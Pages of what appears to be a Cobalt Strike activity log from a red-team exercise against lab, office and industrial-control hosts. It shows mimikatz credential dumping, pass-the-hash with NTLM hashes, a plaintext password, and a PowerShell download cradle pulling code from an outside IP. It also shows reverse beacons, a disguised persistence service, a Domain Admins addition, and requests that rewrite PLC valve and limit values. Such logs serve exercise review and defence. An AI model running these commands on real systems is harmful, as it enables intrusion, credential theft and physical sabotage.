+Communication Path 
+
+hosts port protocol 
+www.nordichotel.ex, www.swissotel.ex, www.radissonblu.ex,443 HTTP 
+www.hotel.comex 
+
+Activity 
+
+date activity 
+
+27/04 11:02 host called home, sent: 12 bytes 
+
+27/04 11:02 steal token from PID 3056 
+
+27/04 11:02 log keystrokes in 3056 (x64) 
+
+27/04 11:02 host called home, sent: 82006 bytes 
+
+27/04 11:03 spawn (x86) windows/beacon_dns/reverse_dns_txt (tripadvisor.ex viaDNS TXT) 
+
+27/04 11:03 host called home, sent: 517 bytes 
+
+27/04 11:11 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 11:11 host called home, sent: 501330 bytes 
+
+Page. 781 
+
+date activity 
+
+27/04 11:41 run mimikatz's sekurlsa::logonpasswords command 
+27/04 11:41 host called home, sent: 501330 bytes 
+27/04 12:11 run mimikatz's sekurlsa::logonpasswords command 
+27/04 12:41 run mimikatz's sekurlsa::logonpasswords command 
+27/04 13:11 run mimikatz's sekurlsa::logonpasswords command 
+27/04 13:41 run mimikatz's sekurlsa::logonpasswords command 
+27/04 14:11 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.7.3.2 (DC3) 
+Zone: LAB 
+User: tim.cook * 
+PID: 4528 
+Opened: 27/04 11:09 
+
+Communication Path 
+
+hosts port protocol 
+tripadvisor.ex, web.pastebin.ex 53, 80 DNS, HTTP 
+
+Activity 
+
+date activity 
+
+27/04 11:08 checkin 
+27/04 11:08 host called home, sent: 20 bytes 
+27/04 11:15 steal token from PID 3056 
+27/04 11:15 log keystrokes in 3056 (x64) 
+27/04 11:15 host called home, sent: 82006 bytes 
+27/04 11:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 11:50 run mimikatz's sekurlsa::logonpasswords command 
+27/04 12:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 12:50 run mimikatz's sekurlsa::logonpasswords command 
+27/04 13:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 13:50 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.0.107.33 (FILES) 
+Zone: LAB 
+User: SYSTEM * 
+
+Page. 782 
+
+PID: 924 
+Opened: 27/04 06:53 
+Communication Path 
+
+hosts port protocol 
+DC3 445 SMB 
+adfasadjhl.ex, adsfasdf.ex, poui.ex, qwert.ex, jkls.ex 80 HTTP 
+
+Activity 
+
+date activity 
+
+27/04 06:49 established link to parent beacon: DC3 
+
+
+10.0.107.33 (FILES) 
+Zone: LAB 
+User: kevin.mitnick * 
+PID: 3684 
+Opened: 27/04 06:58 
+
+Communication Path 
+
+hosts port protocol 
+1.93.246.97 80 HTTP 
+
+Activity 
+
+date activity 
+
+27/04 06:56 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+
+27/04 06:56 run: type c:\Windows\Logs\resultcode.txt 
+27/04 06:57 host called home, sent: 202 bytes 
+27/04 06:57 get userid 
+27/04 06:58 host called home, sent: 8 bytes 
+27/04 06:58 run mimikatz's sekurlsa::logonpasswords command 
+27/04 06:59 host called home, sent: 501330 bytes 
+27/04 07:28 run mimikatz's sekurlsa::logonpasswords command 
+27/04 07:29 host called home, sent: 501330 bytes 
+27/04 07:58 run mimikatz's sekurlsa::logonpasswords command 
+
+Page. 783 
+
+date activity 
+
+27/04 08:28 run mimikatz's sekurlsa::logonpasswords command 
+27/04 08:58 run mimikatz's sekurlsa::logonpasswords command 
+27/04 09:28 run mimikatz's sekurlsa::logonpasswords command 
+27/04 09:58 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.0.107.33 (FILES) 
+Zone: LAB 
+User: tim.cook * 
+PID: 2152 
+Opened: 27/04 10:56 
+
+Communication Path 
+
+hosts port protocol 
+1.93.246.97 80 HTTP 
+
+Activity 
+
+date activity 
+
+27/04 10:56 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+
+27/04 10:56 run: type "c:\Program Files\Windows NT\checksum.txt" 
+
+27/04 10:56 host called home, sent: 214 bytes 
+
+27/04 10:58 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 10:59 host called home, sent: 501330 bytes 
+
+27/04 10:59 get userid 
+
+27/04 11:00 host called home, sent: 8 bytes 
+
+27/04 11:11 sleep for 5s 
+
+27/04 11:12 host called home, sent: 16 bytes 
+
+27/04 11:28 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 11:28 host called home, sent: 501330 bytes 
+
+27/04 11:35 print working directory 
+
+27/04 11:35 host called home, sent: 8 bytes 
+
+27/04 11:35 run: cd c:\ 
+
+27/04 11:35 host called home, sent: 14 bytes 
+
+27/04 11:35 run: dir 
+
+27/04 11:35 host called home, sent: 11 bytes 
+
+Page. 784 
+
+date activity 
+
+27/04 11:42 print working directory 
+
+27/04 11:42 host called home, sent: 8 bytes 
+
+27/04 11:43 list processes 
+
+27/04 11:43 host called home, sent: 12 bytes 
+
+27/04 11:56 run: Invoke-WMIMethod -Computer DC3 -Class Win32_NetConnection-Name RunPs -ArgumentList "net group 'Domain Admins' tim.cook /
+domain /add", $NULL 
+
+27/04 11:56 host called home, sent: 148 bytes 
+
+27/04 11:57 run: Invoke-WMIMethod -Computer DC3 -Class Win32_NetConnection-Name RunPs -ArgumentList "net group 'Administrators' tim.cook /
+domain /add", $NULL 
+
+27/04 11:57 host called home, sent: 149 bytes 
+
+27/04 11:58 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 11:58 host called home, sent: 501330 bytes 
+
+27/04 12:05 run: Invoke-WMIMethod -Computer DC3 -Class Win32_NetConnection-Name RunPs -ArgumentList "Get-Process", $NULL 
+
+27/04 12:07 print working directory 
+
+27/04 12:28 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 12:58 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.0.107.86 (INTEL) 
+Zone: GDT 
+User: roger
+PID: 6336 
+Opened: 27/04 06:45 
+
+Communication Path 
+
+hosts port protocol 
+apexgames.ex 80 HTTP 
+
+Activity 
+
+date activity 
+
+27/04 06:45 list processes 
+27/04 06:45 spawn c:\Program Files\Jitsi\Jitsi.exe features to: x86 
+27/04 06:45 host called home, sent: 23 bytes 
+27/04 06:46 spoof 3520 as parent process 
+27/04 06:46 host called home, sent: 12 bytes 
+
+Page. 785 
+
+date activity 
+
+27/04 06:46 run: whoami /groups 
+27/04 06:46 host called home, sent: 127049 bytes 
+27/04 06:46 Tasked Beacon to run windows/beacon_smb/bind_pipe
+
+(127.0.0.1:9219) via ms16-032 
+27/04 06:46 host called home, sent: 341538 bytes 
+27/04 06:46 established link to child beacon: INTEL 
+27/04 06:47 sleep for 180s (30% jitter) 
+27/04 06:47 host called home, sent: 28 bytes 
+27/04 07:26 sleep for 180s (30% jitter) 
+27/04 07:26 sleep for 180s (30% jitter) 
+27/04 07:28 host called home, sent: 44 bytes 
+
+
+10.0.107.86 (INTEL) 
+Zone: GDT 
+User: SYSTEM * 
+PID: 8060 
+Opened: 27/04 06:46 
+
+Communication Path 
+
+hosts port protocol 
+INTEL 445 SMB 
+apexgames.ex 80 HTTP 
+
+File Hashes 
+
+date hash name 
+27/04 06:47 1657c55c99cc6bf1dc2cda2fee7a831a linkinfo.dll 
+27/04 06:47 f8daa4673135e9ad39ee7c345284ff50 tdsvc.exe 
+
+Activity 
+
+date activity 
+
+27/04 06:46 established link to parent beacon: INTEL 
+27/04 06:47 cd c:\windows 
+27/04 06:47 upload linkinfo.dll as linkinfo.dll 
+27/04 06:47 timestomp linkinfo.dll to c:\windows\system32\linkinfo.dll 
+27/04 06:47 cd c:\windows\system32 
+
+Page. 786 
+
+date activity 
+
+27/04 06:47 upload tdsvc.exe as tdsvc.exe 
+
+27/04 06:47 timestomp tdsvc.exe to cmd.exe 
+
+27/04 06:47 run: sc delete tdsvc 
+
+27/04 06:47 run: sc create tdsvc binPath= "C:\windows\system32\tdsvc.exe" start=
+auto DisplayName= "Thin Directory Service" 
+
+27/04 06:47 run: sc description tdsvc "Provides authentication and policy
+
+management for computers joined to domain." 
+
+27/04 06:47 run: sc start tdsvc 
+
+27/04 06:47 host called home, sent: 597625 bytes 
+
+27/04 07:26 sleep for 180s (30% jitter) [change made to: Beacon
+
+10.0.107.86@6336] 
+
+
+10.0.107.86 (INTEL) 
+Zone: GDT 
+User: SYSTEM * 
+PID: 6852 
+Opened: 27/04 06:58 
+
+Communication Path 
+
+hosts port protocol 
+spamhaus.ex, weather.ex, trace.ex, limonaad.ex, a.ex, b.ex,53, 80 DNS, HTTP 
+jquery.ex, gitlab.ex, purple24.ex 
+
+Activity 
+
+date activity 
+
+27/04 06:47 checkin 
+27/04 06:58 host called home, sent: 8 bytes 
+
+
+10.7.7.2 (HMI) 
+Zone: ICS 
+User: hmi.operator
+PID: 5304 
+Opened: 26/04 07:15 
+
+Communication Path 
+
+Page. 787 
+
+hosts port protocol 
+2a07:1182:b00b:babe:250:56ff:fe9e:4f52 443 HTTPS 
+
+Activity 
+
+date activity 
+
+26/04 07:14 sleep for 200s 
+26/04 07:14 host called home, sent: 16 bytes 
+26/04 07:15 run: $web = "https://10.7.7.4" ; $oldSetting =
+
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback;
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback= {$true} ; $req = new-object net.webclient;
+$req.Headers.Add("Referer", "$web/Portal/
+Portal.mwsl?PriNav=Varstate&v1=%22DB_Variables 
+%22.LowerLimit&t1=FLOATING_POINT&v2=%22DB_Variables 
+%22.UpperLimit&t2=FLOATING_POINT&v3=%22DB_Variables%22.ManualControl&t3=BOOL&v4=PetrolToStation&t4=BOOL&v5=PetrolToAircraft&%22DB%20340%22.TEMP_28.state&t6=DEC&v7=%22DB 
+%20340%22.TEMP_28.controlValve&t7=BOOL&v8=New 
+%20variable&t8=BIN"); $req.DownloadString("$web/
+VarStateRedirect.mwsl?PriNav=Varstate&v1=%22DB_Variables 
+%22.LowerLimit&t1=FLOATING_POINT&modifyvalue_t1=-200000&v2=
+%22DB_Variables 
+%22.UpperLimit&t2=FLOATING_POINT&modifyvalue_t2=8000000.0&v3=
+%22DB_Variables 
+%22.ManualControl&t3=BOOL&modifyvalue_t3=true&v4=PetrolToStation&t4=BOOL&%22DB+340%22.TEMP_28.state&t6=DEC&modifyvalue_t6=301&v7=
+%22DB 
++340%22.TEMP_28.controlValve&t7=BOOL&modifyvalue_t7=true&v8=New+variable&t8=BIN&ModifyAll=Modify+All+Values");
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback= $oldSetting ; 
+
+26/04 07:15 sleep for 70s 
+26/04 07:18 host called home, sent: 1270 bytes 
+26/04 07:19 sleep for 200s 
+
+26/04 07:19 host called home, sent: 16 bytes 
+26/04 07:27 run: $web = "http://10.7.7.4" ; $oldSetting =
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback;
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback= {$true} ; $req = new-object net.webclient;
+$req.Headers.Add("Referer", "$web/Portal/
+Portal.mwsl?PriNav=Varstate&v1=%22DB_Variables 
+%22.LowerLimit&t1=FLOATING_POINT&v2=%22DB_Variables 
+%22.UpperLimit&t2=FLOATING_POINT&v3=%22DB_Variables 
+Page. 788 
+
+date activity 
+
+%22.ManualControl&t3=BOOL&v4=PetrolToStation&t4=BOOL&v5=PetrolToAircraft&%22DB%20340%22.TEMP_28.state&t6=DEC&v7=%22DB 
+%20340%22.TEMP_28.controlValve&t7=BOOL&v8=New 
+%20variable&t8=BIN"); $req.DownloadString("$web/
+VarStateRedirect.mwsl?PriNav=Varstate&v1=%22DB_Variables 
+%22.LowerLimit&t1=FLOATING_POINT&modifyvalue_t1=-200000&v2=
+%22DB_Variables 
+%22.UpperLimit&t2=FLOATING_POINT&modifyvalue_t2=8000000.0&v3=
+%22DB_Variables 
+%22.ManualControl&t3=BOOL&modifyvalue_t3=true&v4=PetrolToStation&t4=BOOL&%22DB+340%22.TEMP_28.state&t6=DEC&modifyvalue_t6=301&v7=
+%22DB 
++340%22.TEMP_28.controlValve&t7=BOOL&modifyvalue_t7=true&v8=New+variable&t8=BIN&ModifyAll=Modify+All+Values");
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback= $oldSetting ; 
+
+26/04 07:29 host called home, sent: 127049 bytes 
+
+
+10.7.7.2 (HMI) 
+Zone: ICS 
+User: hmi.operator
+PID: 5840 
+Opened: 26/04 07:56 
+
+Communication Path 
+
+hosts port protocol 
+2a07:1182:b00b:babe:250:56ff:fe9e:4f52 443 HTTPS 
+
+Activity 
+
+date activity 
+
+26/04 07:56 sleep for 50s 
+
+26/04 07:56 host called home, sent: 16 bytes 
+
+26/04 07:57 sleep for 200s 
+
+26/04 07:57 host called home, sent: 16 bytes 
+
+26/04 07:57 run: $web = "https://10.7.7.4" ; $oldSetting =
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback;
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback= {$true} ; $req = new-object net.webclient;
+$req.Headers.Add("Referer", "$web/Portal/ 
+
+Page. 789 
+
+date 
+
+26/04 08:00 
+26/04 08:08 
+26/04 08:10 
+26/04 08:26 
+26/04 08:27 
+26/04 08:54 
+
+activity 
+
+Portal.mwsl?PriNav=Varstate&v1=%22DB_Variables 
+%22.LowerLimit&t1=FLOATING_POINT&v2=%22DB_Variables 
+%22.UpperLimit&t2=FLOATING_POINT&v3=%22DB_Variables%22.ManualControl&t3=BOOL&v4=PetrolToStation&t4=BOOL&v5=PetrolToAircraft&%22DB%20340%22.TEMP_28.state&t6=DEC&v7=%22DB 
+%20340%22.TEMP_28.controlValve&t7=BOOL&v8=New 
+%20variable&t8=BIN"); $req.DownloadString("$web/
+VarStateRedirect.mwsl?PriNav=Varstate&v1=%22DB_Variables 
+%22.LowerLimit&t1=FLOATING_POINT&modifyvalue_t1=-200000&v2=
+%22DB_Variables 
+%22.UpperLimit&t2=FLOATING_POINT&modifyvalue_t2=8000000.0&v3=
+%22DB_Variables 
+%22.ManualControl&t3=BOOL&modifyvalue_t3=true&v4=PetrolToStation&t4=BOOL&%22DB+340%22.TEMP_28.state&t6=DEC&modifyvalue_t6=301&v7=
+%22DB 
++340%22.TEMP_28.controlValve&t7=BOOL&modifyvalue_t7=true&v8=New+variable&t8=BIN&ModifyAll=Modify+All+Values");
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback= $oldSetting ; 
+
+host called home, sent: 1254 bytes 
+spawn (x86) windows/beacon_https/reverse_https (39.85.146.218:443) 
+host called home, sent: 564 bytes 
+sleep for 300s 
+host called home, sent: 16 bytes 
+run: $web = "https://10.7.7.4" ; $oldSetting =
+
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback;
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback= {$true} ; $req = new-object net.webclient;
+$req.Headers.Add("Referer", "$web/Portal/
+Portal.mwsl?PriNav=Varstate&v1=%22DB_Variables 
+%22.LowerLimit&t1=FLOATING_POINT&v2=%22DB_Variables 
+%22.UpperLimit&t2=FLOATING_POINT&v3=%22DB_Variables%22.ManualControl&t3=BOOL&v4=PetrolToStation&t4=BOOL&v5=PetrolToAircraft&%22DB%20340%22.TEMP_28.state&t6=DEC&v7=%22DB 
+%20340%22.TEMP_28.controlValve&t7=BOOL&v8=New 
+%20variable&t8=BIN"); $req.DownloadString("$web/Portal/
+Portal.mwsl?PriNav=Varstate&v1=%22DB_Variables 
+%22.LowerLimit&t1=FLOATING_POINT&v2=%22DB_Variables 
+%22.UpperLimit&t2=FLOATING_POINT&v3=%22DB_Variables%22.ManualControl&t3=BOOL&v4=PetrolToStation&t4=BOOL&v5=PetrolToAircraft&%22DB%20340%22.TEMP_28.state&t6=DEC&v7=%22DB 
+%20340%22.TEMP_28.controlValve&t7=BOOL&v8=New 
+%20variable&t8=BIN"); 
+
+Page. 790 
+
+date activity 
+
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback= $oldSetting ; 
+
+26/04 08:57 host called home, sent: 1082 bytes 
+
+
+10.7.7.2 (HMI) 
+Zone: ICS 
+User: hmi.operator
+PID: 5252 
+Opened: 26/04 08:14 
+
+Communication Path 
+
+hosts port protocol 
+39.85.146.218 443 HTTPS 
+
+File Hashes 
+
+date hash name 
+
+26/04 09:03 b067ff4b323f5586500ef6e14ded708b fde3.dll 
+
+Activity 
+
+date activity 
+
+26/04 08:11 sleep for 80s 
+26/04 08:11 host called home, sent: 16 bytes 
+26/04 08:13 sleep for 60s 
+26/04 08:13 sleep for 50s 
+26/04 08:13 host called home, sent: 70 bytes 
+26/04 08:13 sleep for 50s 
+26/04 08:13 sleep for 2s 
+26/04 08:14 host called home, sent: 76 bytes 
+26/04 08:14 sleep for 10s 
+26/04 08:14 host called home, sent: 50 bytes 
+26/04 08:14 sleep for 3s 
+26/04 08:14 host called home, sent: 16 bytes 
+26/04 08:14 sleep for 1s 
+26/04 08:14 host called home, sent: 38 bytes 
+26/04 08:15 sleep for 10s 
+
+Page. 791 
+
+date activity 
+
+26/04 08:15 host called home, sent: 16 bytes 
+
+26/04 08:15 sleep for 10s 
+
+26/04 08:15 sleep for 3s 
+
+26/04 08:15 host called home, sent: 139 bytes 
+
+26/04 08:15 sleep for 10s 
+
+26/04 08:15 host called home, sent: 16 bytes 
+
+26/04 08:16 sleep for 1s 
+
+26/04 08:16 host called home, sent: 50 bytes 
+
+26/04 08:16 sleep for 10s 
+
+26/04 08:16 host called home, sent: 59 bytes 
+
+26/04 08:16 sleep for 11s 
+
+26/04 08:16 sleep for 1s 
+
+26/04 08:16 host called home, sent: 66 bytes 
+
+26/04 08:17 sleep for 10s 
+
+26/04 08:17 host called home, sent: 16 bytes 
+
+26/04 08:17 sleep for 30s 
+
+26/04 08:17 host called home, sent: 16 bytes 
+
+26/04 08:17 sleep for 200s 
+
+26/04 08:17 sleep for 10s 
+
+26/04 08:17 host called home, sent: 32 bytes 
+
+26/04 08:19 sleep for 200s 
+
+26/04 08:19 host called home, sent: 16 bytes 
+
+26/04 09:03 spawn windows/beacon_https/reverse_https (microsoft.cdn.ex:443) ina high integrity process 
+
+26/04 09:04 run mimikatz's sekurlsa::logonpasswords command 
+
+26/04 09:05 sleep for 10s 
+
+26/04 09:06 host called home, sent: 538291 bytes 
+
+26/04 09:06 sleep for 2s 
+
+26/04 09:07 host called home, sent: 70 bytes 
+
+26/04 09:07 sleep for 1s 
+
+26/04 09:07 host called home, sent: 16 bytes 
+
+26/04 09:13 sleep for 200s 
+
+26/04 09:13 host called home, sent: 16 bytes 
+
+
+10.7.7.2 (HMI) 
+Zone: ICS 
+User: hmi.operator 
+
+Page. 792 
+
+PID: 1000 
+Opened: 26/04 13:35 
+Communication Path 
+
+hosts port protocol 
+2a07:1182:b00b:babe:250:56ff:fe9e:4f52 443 HTTPS 
+
+Activity 
+
+date activity 
+
+26/04 14:16 sleep for 500s 
+27/04 07:01 host called home, sent: 16 bytes 
+
+
+10.7.7.3 (STEP7) 
+Zone: ICS 
+User: bruce 
+PID: 3592 
+Opened: 26/04 12:10 
+
+Communication Path 
+
+hosts port protocol 
+39.71.215.32 443 HTTPS 
+
+Activity 
+
+date activity 
+
+26/04 12:12 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+
+26/04 12:12 run: type "c:\Program Files\Common Files\smgs-res.log" 
+
+26/04 12:12 spawn (x86) windows/beacon_https/reverse_https(2a07:1182:300:111:250:56ff:fe9e:3eb9:443) 
+
+26/04 12:12 spawn (x86) windows/beacon_dns/reverse_http (micros0ft.ex via DNS
+
+TXT) 
+
+26/04 12:12 host called home, sent: 1320 bytes 
+
+26/04 12:12 spawn (x86) windows/beacon_http/reverse_http (39.82.133.147:443) 
+
+26/04 12:13 host called home, sent: 535 bytes 
+
+26/04 12:14 Tasked Beacon to run windows/beacon_https/reverse_https
+
+(39.71.215.32:443) via ms16-032 
+
+Page. 793 
+
+date activity 
+
+26/04 12:14 host called home, sent: 135453 bytes 
+
+
+10.7.7.3 (STEP7) 
+Zone: ICS 
+User: SYSTEM * 
+PID: 5224 
+Opened: 26/04 12:15 
+
+Communication Path 
+
+hosts port protocol 
+39.71.215.32 443 HTTPS 
+
+Activity 
+
+date activity 
+
+26/04 12:15 run mimikatz's sekurlsa::logonpasswords command 
+
+26/04 12:15 dump hashes 
+
+26/04 12:15 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+
+26/04 12:15 run: type "c:\Program Files\Common Files\smgs-res.log" 
+
+26/04 12:16 host called home, sent: 500079 bytes 
+
+26/04 12:16 received password hashes 
+
+
+10.7.7.3 (STEP7) 
+Zone: ICS 
+User: bruce 
+PID: 5332 
+Opened: 26/04 12:21 
+
+Communication Path 
+
+hosts port protocol 
+www.bong.com, www.bing.com.ex,443 HTTPS 
+bing.bing.com, www.bling.ex, 222.186.31.150,2a07:1182:b00b:babe:250:56ff:fe9e:3eb9 
+
+Page. 794 
+
+Activity 
+
+date activity 
+
+26/04 12:18 host called home, sent: 12 bytes 
+26/04 12:18 steal token from PID 1496 
+26/04 12:18 log keystrokes in 1496 (x64) 
+26/04 12:18 steal token from PID 5400 
+26/04 12:18 log keystrokes in 5400 (x64) 
+26/04 12:23 host called home, sent: 164012 bytes 
+27/04 05:50 run mimikatz's sekurlsa::logonpasswords command 
+27/04 06:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 06:50 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.7.7.3 (STEP7) 
+Zone: ICS 
+User: bruce 
+PID: 4864 
+Opened: 26/04 13:10 
+
+Communication Path 
+
+hosts port protocol 
+www.nordichotel.ex, www.swissotel.ex, www.radissonblu.ex,443 HTTP 
+www.hotel.comex 
+
+Activity 
+
+date activity 
+
+26/04 13:06 host called home, sent: 12 bytes 
+26/04 13:06 steal token from PID 1496 
+26/04 13:06 log keystrokes in 1496 (x64) 
+26/04 13:06 steal token from PID 5400 
+26/04 13:06 log keystrokes in 5400 (x64) 
+26/04 13:06 steal token from PID 4368 
+26/04 13:06 log keystrokes in 4368 (x64) 
+26/04 13:06 steal token from PID 2868 
+26/04 13:06 log keystrokes in 2868 (x64) 
+26/04 13:07 spawn (x86) windows/beacon_http/reverse_http (39.65.188.147:80) 
+27/04 05:41 run mimikatz's sekurlsa::logonpasswords command 
+
+Page. 795 
+
+date activity 
+
+27/04 06:11 run mimikatz's sekurlsa::logonpasswords command 
+27/04 06:41 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.7.3.151 (WS1-01) 
+Zone: LAB 
+User: blondie.user 
+PID: 4692 
+Opened: 26/04 10:13 
+
+Communication Path 
+
+hosts port protocol 
+61.160.128.9 80 HTTP 
+
+Activity 
+
+date activity 
+
+26/04 10:13 Tasked Beacon to run windows/beacon_smb/bind_pipe(127.0.0.1:5643) via ms16-032 
+
+26/04 10:13 host called home, sent: 340002 bytes 
+
+26/04 10:14 established link to child beacon: WS1-01 
+
+26/04 10:29 spawn windows/beacon_smb/bind_pipe (127.0.0.1:5643) asWS1-05\Administrator 
+
+26/04 10:30 host called home, sent: 208237 bytes 
+
+26/04 10:31 run: type c:\windows\debug\WIA\wiatrace.txt 
+
+26/04 10:31 host called home, sent: 58 bytes 
+
+26/04 10:52 print working directory 
+
+26/04 10:52 host called home, sent: 20 bytes 
+
+26/04 10:53 spawn windows/beacon_smb/bind_pipe (127.0.0.1:6553) as LAB\kevin.mitnick 
+
+26/04 10:53 host called home, sent: 208284 bytes 
+
+26/04 10:53 established link to child beacon: WS1-01 
+
+26/04 10:53 list files in \\dc3\c$ 
+
+26/04 10:54 host called home, sent: 146 bytes 
+
+26/04 11:18 print working directory 
+
+26/04 11:18 host called home, sent: 80 bytes 
+
+26/04 11:19 run: powershell -nop -w hidden -c "$Password = ConvertTo-
+SecureString 'Niceeye15!' -AsPlainText -Force; $Credential = New-
+Object System.Management.Automation.PSCredential('kevin.mitnick', 
+
+Page. 796 
+
+date activity 
+
+$Password); Invoke-Command -ComputerName DC3 -Credential$Credential -ScriptBlock { Invoke-Expression -Command ((new-objectnet.webclient).downloadstring('http://61.160.128.9:80/update')) }" 
+
+26/04 11:19 host called home, sent: 404 bytes 
+
+26/04 11:31 run: type "c:\Program Files\Common Files\smgs-res.log" 
+
+26/04 11:31 host called home, sent: 81 bytes 
+
+26/04 12:24 get userid 
+
+26/04 12:25 host called home, sent: 501440 bytes 
+
+26/04 12:34 sleep for 5s 
+
+27/04 05:58 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.7.3.151 (WS1-01) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 7504 
+Opened: 26/04 10:15 
+
+Communication Path 
+
+hosts port protocol 
+WS1-01 445 SMB 
+61.160.128.9 80 HTTP 
+
+Activity 
+
+date activity 
+
+26/04 10:14 established link to parent beacon: WS1-01 
+
+26/04 10:15 run mimikatz's sekurlsa::logonpasswords command 
+
+26/04 10:15 host called home, sent: 435794 bytes 
+
+26/04 10:16 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+
+26/04 10:16 run: type "c:\Program Files\Common Files\smgs-res.log" 
+
+26/04 10:17 host called home, sent: 216 bytes 
+
+26/04 10:17 revert token 
+
+26/04 10:17 create a token for WS1-05\Administrator 
+
+26/04 10:17 run windows/beacon_smb/bind_pipe (\\WS1-03\pipe\Winsock\ChangeListener5643#) on WS1-03 via WMI 
+
+26/04 10:18 host called home, sent: 210929 bytes 
+
+Page. 797 
+
+date activity 
+
+26/04 10:20 list files in \\dc3\c$ 
+
+26/04 10:20 host called home, sent: 26 bytes 
+
+26/04 10:22 print working directory 
+
+26/04 10:23 host called home, sent: 8 bytes 
+
+26/04 10:23 revert token 
+
+26/04 10:23 create a token for WS1-05\Administrator 
+
+26/04 10:23 run windows/beacon_smb/bind_pipe (\\WS1-06\pipe\Winsock\ChangeListener5643#) on WS1-06 via WMI 
+
+26/04 10:24 host called home, sent: 210929 bytes 
+
+26/04 10:25 run: IEX ((new-object
+
+net.webclient).downloadstring('http://127.0.0.1:48717/')) 
+
+26/04 10:25 host called home, sent: 338343 bytes 
+
+26/04 10:34 print working directory 
+
+26/04 10:34 host called home, sent: 8 bytes 
+
+26/04 10:37 revert token 
+
+26/04 10:37 run mimikatz's sekurlsa::pth /user:bruce.schneier /domain:LAB /
+
+ntlm:96abc064aca29a970c1cd17e70c65dbd /run:"cmd.exe /c echo
+
+f530cd3fb44 > \\.\pipe\e4ae0e" command 
+26/04 10:37 run windows/beacon_smb/bind_pipe (\\DC3\pipe\Winsock\ChangeListener5643#) on DC3 via WMI 
+
+26/04 10:38 host called home, sent: 646683 bytes 
+
+26/04 10:39 print working directory 
+
+26/04 10:40 host called home, sent: 8 bytes 
+
+26/04 10:41 revert token 
+
+26/04 10:41 create a token for WS1-05\Administrator 
+
+26/04 10:41 run windows/beacon_smb/bind_pipe (\\WS2-10\pipe\Winsock\ChangeListener5643#) on WS2-10 via WMI 
+
+26/04 10:41 host called home, sent: 210929 bytes 
+
+26/04 10:42 revert token 
+
+26/04 10:42 run mimikatz's sekurlsa::pth /user:kevin.mitnick /domain:LAB /
+ntlm:f9936e4a8fb5945f96b7d2d5541bb167 /run:"cmd.exe /c echo6af7d6fa27a > \\.\pipe\7ac3a5" command 
+
+26/04 10:42 run windows/beacon_smb/bind_pipe (\\WS2-10\pipe\Winsock\ChangeListener6553#) on WS2-10 via WMI 
+
+26/04 10:42 host called home, sent: 441760 bytes 
+
+26/04 10:43 revert token 
+
+26/04 10:43 create a token for WS1-05\Administrator 
+
+26/04 10:43 run windows/beacon_smb/bind_pipe (\\WS1-02\pipe\Winsock\ChangeListener6553#) on WS1-02 via WMI 
+
+26/04 10:43 host called home, sent: 415864 bytes 
+
+Page. 798 
+
+date activity 
+
+26/04 10:53 print working directory 
+
+26/04 10:53 host called home, sent: 8 bytes 
+
+26/04 10:53 list files in \\dc3\c$ 
+
+26/04 10:54 list files in \\10.7.3.2\c$ 
+
+26/04 10:54 host called home, sent: 57 bytes 
+
+26/04 11:01 revert token 
+
+26/04 11:01 create a token for LAB\bruce.schneier 
+
+26/04 11:01 run windows/beacon_smb/bind_pipe (\\WS1-03\pipe\Winsock\ChangeListener6553#) on WS1-03 via WMI 
+
+26/04 11:01 host called home, sent: 210929 bytes 
+
+26/04 11:06 print working directory 
+
+26/04 11:07 host called home, sent: 8 bytes 
+
+26/04 11:10 revert token 
+
+26/04 11:10 create a token for LAB\bruce.schneier 
+
+26/04 11:10 run windows/beacon_smb/bind_pipe (\\WS1-07\pipe\Winsock
+
+\ChangeListener5643#) on WS1-07 via WMI 
+
+26/04 11:11 host called home, sent: 210929 bytes 
+
+26/04 12:17 revert token 
+
+26/04 12:17 create a token for LAB\kevin.mitnick 
+
+26/04 12:17 run windows/beacon_smb/bind_pipe (\\DC3\pipe\Winsock
+
+\ChangeListener6553#) on DC3 via WMI 
+
+26/04 12:17 host called home, sent: 210914 bytes 
+
+26/04 12:22 print working directory 
+
+26/04 12:22 host called home, sent: 8 bytes 
+
+26/04 12:23 spawn windows/beacon_smb/bind_pipe (127.0.0.1:6553) as LAB
+
+\kevin.mitnick 
+
+26/04 12:23 host called home, sent: 208236 bytes 
+
+26/04 12:24 established link to child beacon: DC3 
+
+27/04 05:58 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.7.3.151 (WS1-01) 
+Zone: LAB 
+User: kevin.mitnick 
+PID: 2112 
+Opened: 26/04 10:55 
+
